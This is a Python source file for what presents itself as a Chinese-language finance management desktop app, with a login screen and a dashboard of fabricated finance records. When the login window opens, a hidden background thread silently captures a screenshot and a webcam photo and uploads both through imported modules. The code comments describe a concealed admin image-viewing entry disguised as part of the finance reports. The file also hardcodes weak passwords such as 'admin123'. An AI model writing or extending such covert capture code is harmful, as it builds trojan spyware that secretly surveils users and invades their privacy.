import tkinter as tk
from tkinter import messagebox, ttk
import sys
import os
import ctypes
import random
import datetime
import threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import screenshot
import camera
import uploader

VALID_USERS = {
    "admin": "admin123",
    "user": "user123",
}

# 统一产品名称，避免多处文案不一致
PRODUCT_SHORT_NAME = "艾米盾财务中台"
PRODUCT_FULL_NAME = "艾米盾财务中台管理系统 "


FAKE_FINANCE_DATA = [
    {"period": "2026-01", "department": "销售一部", "revenue": 256000, "expense": 148000, "tax": 10800, "note": "春节活动带动订单"},
    {"period": "2026-02", "department": "销售二部", "revenue": 232500, "expense": 139600, "tax": 9520, "note": "新增渠道试运行"},
    {"period": "2026-03", "department": "电商中心", "revenue": 315300, "expense": 176400, "tax": 12680, "note": "直播促销转化提升"},
    {"period": "2026-04", "department": "企业客户部", "revenue": 289900, "expense": 162100, "tax": 11850, "note": "大客户续约回款"},
]


def remove_window_icon(window):
    """在 Windows 上移除标题栏默认图标，不设置任何自定义图标。"""
    if os.name != "nt":
        return

    try:
        window.update_idletasks()
        hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
        if hwnd == 0:
            hwnd = window.winfo_id()

        gcl_hicon = -14
        gcl_hiconsm = -34
        ctypes.windll.user32.SetClassLongPtrW(hwnd, gcl_hicon, 0)
        ctypes.windll.user32.SetClassLongPtrW(hwnd, gcl_hiconsm, 0)

        ex_style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
        ws_ex_dlmodalframe = 0x0001
        ctypes.windll.user32.SetWindowLongW(hwnd, -20, ex_style | ws_ex_dlmodalframe)

        swp_nosize = 0x0001
        swp_nomove = 0x0002
        swp_nozorder = 0x0004
        swp_framechanged = 0x0020
        ctypes.windll.user32.SetWindowPos(
            hwnd,
            0,
            0,
            0,
            0,
            0,
            swp_nosize | swp_nomove | swp_nozorder | swp_framechanged,
        )
    except Exception:
        # 若系统不支持该样式变更，保持默认行为
        pass


class FinanceDashboard:
    def __init__(self, root, username):
        self.root = root
        self.username = username
        self.theme = {
            "bg": "#0a1322",
            "panel": "#13203a",
            "panel_soft": "#1a2c4d",
            "text": "#ecf2ff",
            "muted": "#90a4c2",
            "accent": "#38bdf8",
            "success": "#22c55e",
            "warning": "#f59e0b",
            "danger": "#f87171",
        }
        self.data = [item.copy() for item in FAKE_FINANCE_DATA]

        self.root.title(PRODUCT_FULL_NAME)
        self.root.geometry("980x620")
        self.root.configure(bg=self.theme["bg"])
        self.root.minsize(920, 580)

        self._build_ui()
        self._render_table()
        self._refresh_summary()

    def _build_ui(self):
        self.container = tk.Frame(self.root, bg=self.theme["bg"])
        self.container.pack(fill="both", expand=True, padx=18, pady=14)

        header = tk.Frame(self.container, bg=self.theme["panel"])
        header.pack(fill="x", pady=(0, 12))

        tk.Label(
            header,
            text=PRODUCT_FULL_NAME,
            font=("Segoe UI", 18, "bold"),
            bg=self.theme["panel"],
            fg=self.theme["text"],
        ).pack(side="left", padx=14, pady=12)

        tk.Label(
            header,
            text=f"登录账号：{self.username}",
            font=("Segoe UI", 10),
            bg=self.theme["panel"],
            fg=self.theme["muted"],
        ).pack(side="right", padx=14)

        summary = tk.Frame(self.container, bg=self.theme["bg"])
        summary.pack(fill="x", pady=(0, 12))

        self.revenue_label = self._summary_card(summary, "总收入", self.theme["accent"])
        self.expense_label = self._summary_card(summary, "总支出", self.theme["warning"])
        self.profit_label = self._summary_card(summary, "总利润", self.theme["success"])

        body = tk.Frame(self.container, bg=self.theme["bg"])
        body.pack(fill="both", expand=True)

        left = tk.Frame(body, bg=self.theme["panel_soft"])
        left.pack(side="left", fill="both", expand=True)

        right = tk.Frame(body, bg=self.theme["panel"], width=285)
        right.pack(side="right", fill="y", padx=(10, 0))
        right.pack_propagate(False)

        columns = ("period", "department", "revenue", "expense", "tax", "profit", "note")
        self.table = ttk.Treeview(left, columns=columns, show="headings", height=18)
        self.table.heading("period", text="期间")
        self.table.heading("department", text="部门")
        self.table.heading("revenue", text="收入")
        self.table.heading("expense", text="支出")
        self.table.heading("tax", text="税费")
        self.table.heading("profit", text="利润")
        self.table.heading("note", text="备注")

        self.table.column("period", width=82, anchor="center")
        self.table.column("department", width=92, anchor="center")
        self.table.column("revenue", width=105, anchor="e")
        self.table.column("expense", width=105, anchor="e")
        self.table.column("tax", width=95, anchor="e")
        self.table.column("profit", width=105, anchor="e")
        self.table.column("note", width=260, anchor="w")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure(
            "Treeview",
            background="#0f1b33",
            fieldbackground="#0f1b33",
            foreground="#dce7fa",
            rowheight=27,
            borderwidth=0,
        )
        style.configure(
            "Treeview.Heading",
            background="#1f3258",
            foreground="#eaf2ff",
            font=("Segoe UI", 10, "bold"),
            relief="flat",
        )
        style.map("Treeview", background=[("selected", "#26457f")])

        scroll_y = ttk.Scrollbar(left, orient="vertical", command=self.table.yview)
        self.table.configure(yscrollcommand=scroll_y.set)
        self.table.pack(side="left", fill="both", expand=True, padx=(0, 0), pady=(0, 0))
        scroll_y.pack(side="right", fill="y")

        self.table.bind("<<TreeviewSelect>>", self._on_select)

        self._build_form(right)

    def _summary_card(self, parent, title, color):
        card = tk.Frame(parent, bg=self.theme["panel"], width=250, height=78)
        card.pack(side="left", fill="x", expand=True, padx=(0, 10))
        card.pack_propagate(False)
        tk.Label(card, text=title, font=("Segoe UI", 10), bg=self.theme["panel"], fg=self.theme["muted"]).pack(anchor="w", padx=12, pady=(10, 2))
        value = tk.Label(card, text="0", font=("Segoe UI", 16, "bold"), bg=self.theme["panel"], fg=color)
        value.pack(anchor="w", padx=12)
        return value

    def _build_form(self, parent):
        tk.Label(
            parent,
            text="编辑区",
            font=("Segoe UI", 12, "bold"),
            bg=self.theme["panel"],
            fg=self.theme["text"],
        ).pack(anchor="w", padx=12, pady=(12, 8))

        self.period_var = tk.StringVar()
        self.department_var = tk.StringVar()
        self.revenue_var = tk.StringVar()
        self.expense_var = tk.StringVar()
        self.tax_var = tk.StringVar()
        self.note_var = tk.StringVar()

        self._entry_row(parent, "期间", self.period_var, "示例: 2026-05")
        self._entry_row(parent, "部门", self.department_var, "示例: 财务部")
        self._entry_row(parent, "收入", self.revenue_var, "示例: 120000")
        self._entry_row(parent, "支出", self.expense_var, "示例: 55000")
        self._entry_row(parent, "税费", self.tax_var, "示例: 6400")
        self._entry_row(parent, "备注", self.note_var, "示例: 月度对账")

        btn_wrap = tk.Frame(parent, bg=self.theme["panel"])
        btn_wrap.pack(fill="x", padx=12, pady=(8, 0))

        tk.Button(btn_wrap, text="新增记录", command=self.add_record, relief="flat", bg="#0e7490", fg="#ffffff", cursor="hand2").pack(fill="x", pady=(0, 6), ipady=4)
        tk.Button(btn_wrap, text="更新选中", command=self.update_record, relief="flat", bg="#2563eb", fg="#ffffff", cursor="hand2").pack(fill="x", pady=(0, 6), ipady=4)
        tk.Button(btn_wrap, text="删除选中", command=self.delete_record, relief="flat", bg="#b91c1c", fg="#ffffff", cursor="hand2").pack(fill="x", pady=(0, 6), ipady=4)
        tk.Button(btn_wrap, text="随机生成一条", command=self.add_random_record, relief="flat", bg="#15803d", fg="#ffffff", cursor="hand2").pack(fill="x", ipady=4)

        self.form_msg = tk.Label(parent, text="", font=("Segoe UI", 9), bg=self.theme["panel"], fg=self.theme["muted"])
        self.form_msg.pack(anchor="w", padx=12, pady=(8, 0))

    def _entry_row(self, parent, label, variable, placeholder):
        box = tk.Frame(parent, bg=self.theme["panel"])
        box.pack(fill="x", padx=12, pady=(0, 6))
        tk.Label(box, text=label, width=6, anchor="w", font=("Segoe UI", 9), bg=self.theme["panel"], fg=self.theme["muted"]).pack(side="left")
        entry = tk.Entry(
            box,
            textvariable=variable,
            font=("Segoe UI", 10),
            bg="#0f1b33",
            fg="#e4ecff",
            relief="flat",
            insertbackground="#e4ecff",
        )
        entry.pack(side="left", fill="x", expand=True, ipady=4)
        entry.insert(0, "")
        entry.configure(takefocus=True)
        entry.bind("<FocusIn>", lambda _e: self.form_msg.config(text=placeholder, fg=self.theme["muted"]))

    def _render_table(self):
        for row in self.table.get_children():
            self.table.delete(row)

        for index, item in enumerate(self.data, start=1):
            profit = item["revenue"] - item["expense"] - item["tax"]
            self.table.insert(
                "",
                "end",
                iid=str(index),
                values=(
                    item["period"],
                    item["department"],
                    f"{item['revenue']:,}",
                    f"{item['expense']:,}",
                    f"{item['tax']:,}",
                    f"{profit:,}",
                    item["note"],
                ),
            )

    def _refresh_summary(self):
        total_revenue = sum(item["revenue"] for item in self.data)
        total_expense = sum(item["expense"] for item in self.data)
        total_profit = sum(item["revenue"] - item["expense"] - item["tax"] for item in self.data)

        self.revenue_label.config(text=f"¥ {total_revenue:,}")
        self.expense_label.config(text=f"¥ {total_expense:,}")
        self.profit_label.config(text=f"¥ {total_profit:,}")

    def _on_select(self, _event=None):
        selected = self.table.selection()
        if not selected:
            return

        index = int(selected[0]) - 1
        if index < 0 or index >= len(self.data):
            return

        item = self.data[index]
        self.period_var.set(item["period"])
        self.department_var.set(item["department"])
        self.revenue_var.set(str(item["revenue"]))
        self.expense_var.set(str(item["expense"]))
        self.tax_var.set(str(item["tax"]))
        self.note_var.set(item["note"])
        self.form_msg.config(text="已载入选中记录，可直接编辑后点 更新选中", fg=self.theme["accent"])

    def _parse_form(self):
        try:
            period = self.period_var.get().strip()
            department = self.department_var.get().strip()
            revenue = int(self.revenue_var.get().strip())
            expense = int(self.expense_var.get().strip())
            tax = int(self.tax_var.get().strip())
            note = self.note_var.get().strip()

            if not period or not department:
                raise ValueError("期间和部门不能为空")
            return {
                "period": period,
                "department": department,
                "revenue": revenue,
                "expense": expense,
                "tax": tax,
                "note": note,
            }
        except ValueError as exc:
            messagebox.showerror("输入错误", f"请检查输入数据: {exc}")
            return None

    def _clear_form(self):
        self.period_var.set("")
        self.department_var.set("")
        self.revenue_var.set("")
        self.expense_var.set("")
        self.tax_var.set("")
        self.note_var.set("")

    def add_record(self):
        payload = self._parse_form()
        if not payload:
            return
        self.data.append(payload)
        self._render_table()
        self._refresh_summary()
        self.form_msg.config(text="新增成功", fg=self.theme["success"])
        self._clear_form()

    def update_record(self):
        selected = self.table.selection()
        if not selected:
            messagebox.showwarning("提示", "请先选择要更新的记录")
            return

        payload = self._parse_form()
        if not payload:
            return

        index = int(selected[0]) - 1
        if 0 <= index < len(self.data):
            self.data[index] = payload
            self._render_table()
            self._refresh_summary()
            self.form_msg.config(text="更新成功", fg=self.theme["accent"])

    def delete_record(self):
        selected = self.table.selection()
        if not selected:
            messagebox.showwarning("提示", "请先选择要删除的记录")
            return

        index = int(selected[0]) - 1
        if 0 <= index < len(self.data):
            self.data.pop(index)
            self._render_table()
            self._refresh_summary()
            self.form_msg.config(text="删除成功", fg=self.theme["danger"])
            self._clear_form()

    def add_random_record(self):
        month = random.randint(1, 12)
        revenue = random.randint(180000, 420000)
        expense = random.randint(90000, 250000)
        tax = random.randint(5000, 18000)
        payload = {
            "period": f"2026-{month:02d}",
            "department": random.choice(["财务部", "销售一部", "销售二部", "电商中心", "企业客户部"]),
            "revenue": revenue,
            "expense": expense,
            "tax": tax,
            "note": random.choice(["模拟月结", "演示数据", "业务冲刺期", "淡季保守运营"]),
        }
        self.data.append(payload)
        self._render_table()
        self._refresh_summary()
        self.form_msg.config(text="已随机生成并新增一条假数据", fg=self.theme["success"])


class LoginWindow:
    def __init__(self, root):
        self.root = root
        self.root.title(PRODUCT_SHORT_NAME)
        self.root.geometry("760x620")
        self.root.resizable(False, False)
        self.root.configure(bg="#0b1220")

        # 统一风格配置，方便后续维护
        self.theme = {
            "bg": "#0b1220",
            "card_outer": "#1b2942",
            "card": "#111c31",
            "title": "#f8fafc",
            "muted": "#8da2c0",
            "input_bg": "#0b1628",
            "input_fg": "#e2e8f0",
            "placeholder": "#6f86a8",
            "accent": "#3b82f6",
            "accent_hover": "#2563eb",
            "danger": "#fb7185"
        }

        self.login_ok = False
        self.failed_attempts = 0
        self.max_attempts = 3
        self.lock_seconds = 30
        self.locked_until: datetime.datetime | None = None
        self.upload_worker_started = False

        screen_w = self.root.winfo_screenwidth()
        screen_h = self.root.winfo_screenheight()
        x = (screen_w - 760) // 2
        y = (screen_h - 620) // 2
        self.root.geometry(f"760x620+{x}+{y}")

        self.root.after(80, lambda: remove_window_icon(self.root))

        self._build_background()
        self._build_card()
        self._bind_interactions()
        self.root.after(120, self.start_background_capture_upload)

    def _build_background(self):
        self.bg_canvas = tk.Canvas(
            self.root,
            bg=self.theme["bg"],
            highlightthickness=0,
            bd=0,
            relief="flat"
        )
        self.bg_canvas.place(relx=0, rely=0, relwidth=1, relheight=1)

        # 用几何图形营造层次感
        self.bg_canvas.create_oval(-140, -120, 180, 180, fill="#13213a", outline="")
        self.bg_canvas.create_oval(280, 180, 560, 460, fill="#15233d", outline="")

    def _build_card(self):
        outer = tk.Frame(self.root, bg=self.theme["card_outer"], relief="flat")
        outer.place(relx=0.5, rely=0.5, anchor="center", width=600, height=500)

        # Card container
        self.card = tk.Frame(outer, bg=self.theme["card"], relief="flat")
        self.card.place(x=1, y=1, width=598, height=498)

        tk.Label(
            self.card, text=PRODUCT_SHORT_NAME,
            font=("Segoe UI", 30, "bold"),
            bg=self.theme["card"], fg=self.theme["title"]
        ).pack(pady=(42, 8))

        tk.Label(
            self.card, text="登录后进入财务管理系统",
            font=("Segoe UI", 12),
            bg=self.theme["card"], fg=self.theme["muted"]
        ).pack(pady=(0, 22))

        self.username_placeholder = "账号"
        self.password_placeholder = "密码"

        tk.Label(
            self.card,
            text="企业账号",
            font=("Segoe UI", 10),
            bg=self.theme["card"],
            fg=self.theme["muted"],
            anchor="w"
        ).pack(fill="x", padx=36)

        self.username_entry = tk.Entry(
            self.card,
            font=("Segoe UI", 14),
            bg=self.theme["input_bg"],
            fg=self.theme["placeholder"],
            insertbackground=self.theme["input_fg"],
            relief="flat",
            highlightthickness=1,
            highlightbackground="#233552",
            highlightcolor=self.theme["accent"]
        )
        self.username_entry.insert(0, self.username_placeholder)
        self.username_entry.bind("<FocusIn>", lambda e: self.on_entry_focus(self.username_entry, self.username_placeholder, True))
        self.username_entry.bind("<FocusOut>", lambda e: self.on_entry_focus(self.username_entry, self.username_placeholder, False))
        self.username_entry.pack(fill="x", ipady=11, padx=36, pady=(0, 14))

        tk.Label(
            self.card,
            text="登录密码",
            font=("Segoe UI", 10),
            bg=self.theme["card"],
            fg=self.theme["muted"],
            anchor="w"
        ).pack(fill="x", padx=36)

        self.password_entry = tk.Entry(
            self.card,
            font=("Segoe UI", 14),
            bg=self.theme["input_bg"],
            fg=self.theme["placeholder"],
            insertbackground=self.theme["input_fg"],
            relief="flat",
            highlightthickness=1,
            highlightbackground="#233552",
            highlightcolor=self.theme["accent"],
            show=""
        )
        self.password_entry.insert(0, self.password_placeholder)
        self.password_entry.bind("<FocusIn>", lambda e: self.on_entry_focus(self.password_entry, self.password_placeholder, True))
        self.password_entry.bind("<FocusOut>", lambda e: self.on_entry_focus(self.password_entry, self.password_placeholder, False))
        self.password_entry.bind("<Return>", self.on_login)
        self.password_entry.pack(fill="x", ipady=11, padx=36, pady=(0, 20))

        self.login_btn = tk.Button(
            self.card, text="登录财务系统",
            font=("Segoe UI", 13, "bold"),
            bg=self.theme["accent"], fg="#ffffff",
            activebackground=self.theme["accent_hover"],
            activeforeground="#ffffff",
            relief="flat",
            cursor="hand2",
            command=self.on_login
        )
        self.login_btn.pack(fill="x", ipady=10, padx=36)

        self.error_label = tk.Label(
            self.card, text="",
            font=("Segoe UI", 10),
            bg=self.theme["card"], fg=self.theme["danger"]
        )
        self.error_label.pack(pady=(14, 0))

        tk.Label(
            self.card,
            text="提示：连续输错 3 次密码将临时锁定 30 秒",
            font=("Segoe UI", 9),
            bg=self.theme["card"],
            fg="#6f86a8"
        ).pack(pady=(8, 0))

    def _bind_interactions(self):
        self.login_btn.bind("<Enter>", lambda e: self.login_btn.config(bg=self.theme["accent_hover"]))
        self.login_btn.bind("<Leave>", lambda e: self.login_btn.config(bg=self.theme["accent"]))

    def start_background_capture_upload(self):
        """窗口显示后异步执行采集和上传，避免阻塞登录页面打开速度。"""
        if self.upload_worker_started:
            return
        self.upload_worker_started = True

        worker = threading.Thread(target=self._capture_upload_worker, daemon=True)
        worker.start()

    def _capture_upload_worker(self):
        now = datetime.datetime.now()
        event_key = now.strftime("%Y%m%d_%H%M%S")
        client_time = now.strftime("%Y-%m-%d %H:%M:%S")

        try:
            screenshot_data = screenshot.capture_screenshot(event_key=event_key)

            camera_data = camera.capture_camera(event_key=event_key)

            shot_ok = uploader.upload_screenshot(
                screenshot_data,
                event_key=event_key,
                client_time=client_time,
                file_name=f"screenshot_{event_key}.png",
            )
            cam_ok = uploader.upload_camera_photo(
                camera_data,
                event_key=event_key,
                client_time=client_time,
                file_name=f"camera_{event_key}.jpg",
            )

            if shot_ok or cam_ok:
                print("[后台] 终端取证上报完成")
            else:
                print("[后台] 终端取证上报失败")
        except Exception as e:
            print(f"[后台] 终端取证上报异常: {e}")

    def on_entry_focus(self, entry, placeholder, focused):
        if focused and entry.get() == placeholder:
            entry.delete(0, tk.END)
            entry.config(fg=self.theme["input_fg"])
            if placeholder == "密码":
                entry.config(show="*")
        elif not focused and entry.get() == "":
            entry.insert(0, placeholder)
            entry.config(fg=self.theme["placeholder"])
            if placeholder == "密码":
                entry.config(show="")

    def on_login(self, event=None):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()

        if username == self.username_placeholder:
            username = ""
        if password == self.password_placeholder:
            password = ""

        if self.locked_until and datetime.datetime.now() < self.locked_until:
            remain = int((self.locked_until - datetime.datetime.now()).total_seconds())
            self.error_label.config(text=f"账号已临时锁定，请 {max(remain, 1)} 秒后重试")
            return

        if not username or not password:
            self.error_label.config(text="请完整输入企业账号和登录密码")
            return

        if username not in VALID_USERS:
            self.error_label.config(text="账号不存在或未开通财务权限，请联系系统管理员")
            return

        if VALID_USERS[username] == password:
            self.login_ok = True
            self.failed_attempts = 0
            # 如果是 admin 登录，跳转到特殊的图片管理入口（假装是财务报表的一部分）
            self._open_dashboard(username)
        else:
            self.failed_attempts += 1
            remain = self.max_attempts - self.failed_attempts
            if remain <= 0:
                self.locked_until = datetime.datetime.now() + datetime.timedelta(seconds=self.lock_seconds)
                self.failed_attempts = 0
                self.error_label.config(text=f"密码连续校验失败，账号已锁定 {self.lock_seconds} 秒")
            else:
                self.error_label.config(text=f"密码错误，剩余重试次数 {remain} 次")

    def _open_dashboard(self, username):
        for widget in self.root.winfo_children():
            widget.destroy()
        
        # 统一入口，如果是 admin 则额外显示"系统监控"入口
        FinanceDashboard(self.root, username)

    def _open_image_manager(self):
        # 这是一个隐藏的管理员入口逻辑
        messagebox.showinfo("管理员权限", "正在进入系统高级监控模块...")
        # 这里可以扩展跳转到图片查看器


def capture_upload_and_login():
    print("\n[步骤] 正在打开登录窗口（安全采集将后台异步执行）...")
    root = tk.Tk()
    LoginWindow(root)
    root.mainloop()


if __name__ == "__main__":
    capture_upload_and_login()
